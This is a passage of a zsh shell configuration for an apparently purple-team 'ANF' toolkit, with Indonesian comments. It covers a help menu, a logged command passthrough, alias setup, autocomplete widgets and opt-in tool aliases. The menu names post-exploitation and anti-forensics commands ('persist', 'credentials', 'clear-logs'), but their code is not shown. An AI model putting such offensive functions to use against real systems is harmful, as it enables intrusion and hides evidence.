        "Defense / Blue:suricata yara-scan honeypot wazuh-agent guardfall-metrics benchmark-guardfall"
        "Post-Exploitation:persist credentials screenshot-all clear-logs playbook"
        "C2 Detection Analytics:c2-entropy c2-beacon-math c2-ml-hunt c2-zscore eval-entropy-roc eval-compare-ml eval-export-audit"
        "Network & OPSEC:serve serve-stop listen screenshot check-ip clear-ip panic tor proxy encode decode hash"
        "Integrations & AI:hermes hermes-locate hermes-set github ai-assist ai-log"
        "Utilities:uuid random epoch clip"
        "Output:report sysinfo"
        "Research & Math:why gen task q gitx envcard mvp mlinfo stat mlbench dlcheck dataset paperstat plot calc sym sha exp csv bib ensure"
    )
    for entry in "${categories[@]}"; do
        local cat="${entry%%:*}" cmds="${entry#*:}"
        print "\n  ${BOLD}${C_M}── ${cat} ──${C_0}"
        for cmd in ${(s: :)cmds}; do
            printf "    %s%-24s%s %s%s%s\n" \
                "$C_A" "$cmd" "$C_0" \
                "$C_T" "${_ANF_CMD_DESC[$cmd]}" "$C_0"
        done
    done
    print ""
}

# ==============================================================================
# SECTION 17 — Passthrough terkontrol (v1.0.2-cyber, dirapikan v1.0.3)
# `anf run -- <cmd> [args]` = satu-satunya pintu menjalankan perintah eksternal
# dari ANF. Tanpa eval, tiap panggilan dicatat ke $AF_LOG_FILE, exit code
# diteruskan. Alias ANF (stat/install/proxy/...) TIDAK ikut terpanggil karena
# "$@" tidak di-reparse sebagai alias — `anf run -- stat` tetap /usr/bin/stat.
# Ditaruh SEBELUM loop alias di bawah supaya `run` ikut dapat alias nama polos.
# ==============================================================================
anf_run() {
    [[ "${1:-}" == "--" ]] && shift
    if [[ $# -eq 0 ]]; then
        _anf_log err "Usage: anf run -- <command> [args...]"
        return 1
    fi
    _anf_log info "run: $*"
    "$@"
}
_ANF_CMD_DESC+=( \
    run    "Jalankan perintah eksternal: anf run -- <cmd> [args]" \
)
typeset -ga _ANF_CMD_NAMES=(${(k)_ANF_CMD_DESC})

# Alias command -> fungsi (dibuat DI SINI, setelah semua fungsi command ada).
# Nama polos saja (help -> anf_help, scan -> anf_scan, run -> anf_run, dst.).
# Prefix "/" tidak dipakai: zsh memperlakukan "/cmd" sebagai path, sehingga
# alias berprefix garis-miring itu tidak pernah aktif (dibersihkan di v1.0.3).
# v1.0.4: JANGAN menimpa biner nyata (stat, install, proxy, whois, nikto,
# gobuster, whatweb, tor, hermes). Bila nama itu ada di PATH, alias dilewati;
# perintah ANF tetap bisa dipanggil sebagai `anf <cmd>`.
typeset -ga _ANF_SHADOWED=()
for _cmd in "${_ANF_CMD_NAMES[@]}"; do
    _func="anf_${_cmd//-/_}"
    (( ${+functions[$_func]} )) || continue
    if (( ${+commands[$_cmd]} )); then
        _ANF_SHADOWED+=("$_cmd")
        continue
    fi
    alias "$_cmd"="$_func"
done
unset _cmd _func

# ==============================================================================
# SECTION 11 — ZLE Widgets (Autocomplete Popup)
# [FIX-ZLE] Perbaiki logic BUFFER assignment di _anf_ki_accept
# ==============================================================================
typeset -ga _anf_popup_matches
typeset -gi _anf_popup_sel=1
typeset -gi _anf_popup_active=0
zle -A .accept-line _anf_original_accept

_anf_popup_filter() {
    _anf_popup_matches=()
    local buf="$LBUFFER$RBUFFER"
    if [[ "$buf" == /* && "$buf" != *' '* ]]; then
        local prefix="${buf#/}"
        for c in "${_ANF_CMD_NAMES[@]}"; do
            [[ "$c" == ${prefix}* ]] && _anf_popup_matches+=("$c")
        done
    fi
    if (( ${#_anf_popup_matches} > 0 )); then
        _anf_popup_active=1
        (( _anf_popup_sel < 1 || _anf_popup_sel > ${#_anf_popup_matches} )) && \
            _anf_popup_sel=1
    else
        _anf_popup_active=0
        _anf_popup_sel=1
    fi
    _anf_popup_render
}

_anf_popup_render() {
    region_highlight=()
    POSTDISPLAY=""
    (( ! _anf_popup_active )) && { zle -R; return; }
    local out=$'\n╭─ /'${LBUFFER#/}$' matches ─╮\n'
    local i=1
    for c in "${_anf_popup_matches[@]}"; do
        if (( i == _anf_popup_sel )); then
            out+="│ ❯ /${c}  ${_ANF_CMD_DESC[$c]}"$'\n'
        else
            out+="│   /${c}  ${_ANF_CMD_DESC[$c]}"$'\n'
        fi
        (( i++ ))
    done
    out+="╰─────────────────────╯"
    POSTDISPLAY="$out"
    zle -R
}

_anf_ki_self_insert() { zle .self-insert; _anf_popup_filter; }
_anf_ki_backspace()   { zle .backward-delete-char; _anf_popup_filter; }
_anf_ki_down() {
    if (( _anf_popup_active )); then
        (( _anf_popup_sel = _anf_popup_sel % ${#_anf_popup_matches} + 1 ))
        _anf_popup_render
    else
        zle .down-line-or-history
    fi
}
_anf_ki_up() {
    if (( _anf_popup_active )); then
        (( _anf_popup_sel-- ))
        (( _anf_popup_sel < 1 )) && _anf_popup_sel=${#_anf_popup_matches}
        _anf_popup_render
    else
        zle .up-line-or-history
    fi
}

# [FIX-ZLE] Logic BUFFER assignment diperbaiki (v13 ada syntax error)
_anf_ki_accept() {
    if (( _anf_popup_active && ${#_anf_popup_matches} > 0 )); then
        BUFFER="/${_anf_popup_matches[_anf_popup_sel]}"
        CURSOR=${#BUFFER}
        POSTDISPLAY=""
        _anf_popup_active=0
        zle -R
        zle _anf_original_accept
        return
    fi
    if [[ "$BUFFER" == /* ]]; then
        local cmd="${${BUFFER#/}%% *}"
        local func="anf_${cmd//-/_}"
        if (( ${+functions[$func]} )); then
            # [FIX-ZLE] Gunakan if/else bukan assignment langsung
            if [[ "$BUFFER" == *' '* ]]; then
                BUFFER="$func ${BUFFER#* }"
            else
                BUFFER="$func"
            fi
            POSTDISPLAY=""
            _anf_popup_active=0
            zle -R
            zle _anf_original_accept
            return
        fi
    fi
    zle _anf_original_accept
}

zle -N self-insert         _anf_ki_self_insert
zle -N backward-delete-char _anf_ki_backspace
zle -N up-line-or-history  _anf_ki_up
zle -N down-line-or-history _anf_ki_down
zle -N accept-line         _anf_ki_accept
bindkey '^M' accept-line
bindkey '^J' accept-line

# ==============================================================================
# SECTION 12 — Banner & Prompt
# ==============================================================================
anf_banner() {
    trap 'return' INT
    _anf_box "$C_L" "ANF SHELL (Cyber + Research) v${ANF_VERSION}" \
                   "Purple Team │ C2 │ Recon │ OSINT │ Exploit │ Research"
    cat << BANNER
${C_G}[✓] GuardFall v2  — Unicode normalization, TP/FP/F1 metrics
[✓] C2 v2         — hardened subprocess.run(), JSONL session log
[✓] Analytics     — Shannon CI, Chi-Square, Isolation Forest, ROC
[✓] Defense       — Suricata, Yara, Honeypot, Wazuh
[✓] Session       — $(date +%H:%M:%S)
${C_T}Type 'help' for all commands (atau anf-cyber help).${C_0}
BANNER
    trap - INT
    PROMPT="%F{#5C4A1E}┌──%f(%F{#DD8E35}%n%f%F{#5C4A1E}@%f%F{#FFAA44}%m%f)-[%F{#F5E6D0}%~%f]"$'\n'"%(?.%F{#66BB6A}◎ ❯ %f.%F{#EF5350}✘ ❯ %f)"
}

if [[ $- == *i* ]]; then anf_banner; fi
_anf_log ok "ANF v${ANF_VERSION} loaded. Type 'help'"

# ==============================================================================
# SECTION 13 — Tool Integrations (Auto-generated)
# ==============================================================================
# v1.0.4: seluruh blok ini OPT-IN. Default ANF tidak mengganti cat/ls/grep/cd/
# less/fd/log dengan alternatif, supaya shell berperilaku seperti zsh biasa dan
# tidak bentrok dengan kebiasaan/tool lain. Aktifkan dengan `ANF_UX_ALIASES=1`
# di ~/.config/anf-cyber/anfrc (atau `ANF_UX_ALIASES=1 anf`).
if [[ "${ANF_UX_ALIASES:-0}" == "1" ]]; then

# bat — cat replacement
if command -v bat >/dev/null 2>&1; then
    alias cat='bat --pager=never'
    alias less='bat --paging=always'
    export BAT_THEME="TwoDark"
    export MANPAGER="sh -c 'col -bx | bat -l man -p'"
fi

# eza — ls replacement
if command -v eza >/dev/null 2>&1; then
    alias ls='eza --icons --group-directories-first'
    alias ll='eza -la --icons --git --group-directories-first'
    alias la='eza -a --icons'
    alias lt='eza --tree --icons --level=2'
    alias ltt='eza --tree --icons --level=3'
fi

# fd-find
if command -v fdfind >/dev/null 2>&1; then
    alias fd='fdfind'
    export FZF_DEFAULT_COMMAND='fdfind --type f --hidden --follow --exclude .git'
elif command -v fd >/dev/null 2>&1; then
    export FZF_DEFAULT_COMMAND='fd --type f --hidden --follow --exclude .git'
fi

# ripgrep
if command -v rg >/dev/null 2>&1; then
    alias grep='rg'
    mkdir -p "$HOME/.config/ripgrep"
    export RIPGREP_CONFIG_PATH="$HOME/.config/ripgrep/config"
fi

# fzf
if command -v fzf >/dev/null 2>&1; then
    [[ -f /usr/share/doc/fzf/examples/key-bindings.zsh ]] && \
        source /usr/share/doc/fzf/examples/key-bindings.zsh
    [[ -f /usr/share/doc/fzf/examples/completion.zsh ]] && \
        source /usr/share/doc/fzf/examples/completion.zsh
    export FZF_DEFAULT_OPTS='
        --height 40% --layout=reverse
        --border=rounded --preview-window=right:50%:wrap'
    export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
    export FZF_CTRL_R_OPTS='--sort --exact'
    alias fzp='fzf --preview "bat --color=always --style=numbers {}"'
fi

# zoxide — cd replacement
if command -v zoxide >/dev/null 2>&1; then
    eval "$(zoxide init zsh)"
    alias cd='z'
    alias cdi='zi'
fi

# tealdeer
if command -v tldr >/dev/null 2>&1; then
    alias h='tldr'
fi

# tmux
if command -v tmux >/dev/null 2>&1; then
    alias tmx='tmux new-session -A -s main'
    alias tls='tmux ls'
    alias tka='tmux kill-server'
fi

# lazygit
command -v lazygit >/dev/null 2>&1 && alias lg='lazygit'

# ranger
if command -v ranger >/dev/null 2>&1; then
    rangercd() {
        local tmp
        tmp="$(mktemp)"
        ranger --choosedir="$tmp" "$@"
        if [[ -f "$tmp" ]]; then
            local dir
            dir="$(cat "$tmp")"
            rm -f "$tmp"
            [[ -n "$dir" && "$dir" != "$PWD" ]] && z "$dir"
        fi
    }
    alias rcd='rangercd'
fi

# ncdu
command -v ncdu >/dev/null 2>&1 && alias du='ncdu --color dark -x'

# btop
command -v btop >/dev/null 2>&1 && alias top='btop' && alias htop='btop'

# bandwhich
command -v bandwhich >/dev/null 2>&1 && alias bw='sudo bandwhich'

# lnav
if command -v lnav >/dev/null 2>&1; then
    alias log='lnav'
    alias slog='sudo lnav /var/log/syslog'
fi

# hexyl
command -v hexyl >/dev/null 2>&1 && alias hex='hexyl' && alias xxd='hexyl'

# glow — markdown viewer
if command -v glow >/dev/null 2>&1; then
    alias md='glow'
    alias mdp='glow -p'
fi

# fx — JSON viewer
command -v fx >/dev/null 2>&1 && alias json='fx'

# zellij
if command -v zellij >/dev/null 2>&1; then
    alias zj='zellij'
    alias zja='zellij attach'
    alias zjl='zellij list-sessions'
fi

# zsh plugins
[[ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]] && \
    source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
[[ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]] && \
    source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh

export ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#5C4A1E'
export ZSH_AUTOSUGGEST_STRATEGY=(history completion)

# pipx
command -v pipx >/dev/null 2>&1 && export PATH="$HOME/.local/bin:$PATH"

# rclone
command -v rclone >/dev/null 2>&1 && alias rc='rclone'

fi   # ANF_UX_ALIASES (SECTION 13 opt-in)
